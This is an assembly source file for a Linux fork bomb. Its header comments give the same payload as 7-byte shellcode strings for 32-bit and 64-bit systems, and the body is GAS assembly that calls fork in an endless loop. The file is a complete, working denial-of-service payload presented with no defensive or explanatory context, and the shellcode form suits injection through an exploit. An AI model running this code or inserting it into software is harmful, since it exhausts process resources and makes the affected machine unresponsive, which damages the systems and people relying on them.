# /* Basic forkbomb (both x86 and x64 compatible) - Length: 9 bytes */
# char shellcode_32[] = "\x6a\x02\x58\xcd\x80\xeb\xf9"
# char shellcode_64[] = "\x6a\x39\x58\x0f\x05\xeb\xf9"
.if ARCH == 64
	.set __NR_fork, 57
	.set Eax, %rax
	.macro _syscall
		syscall
	.endm
.else
	.set __NR_fork, 2
	.set Eax, %eax
	.macro _syscall
		int $0x80
	.endm
.endif

.text
.globl _start
_start:
	push   $__NR_fork
	pop    Eax
	_syscall
	jmp    _start
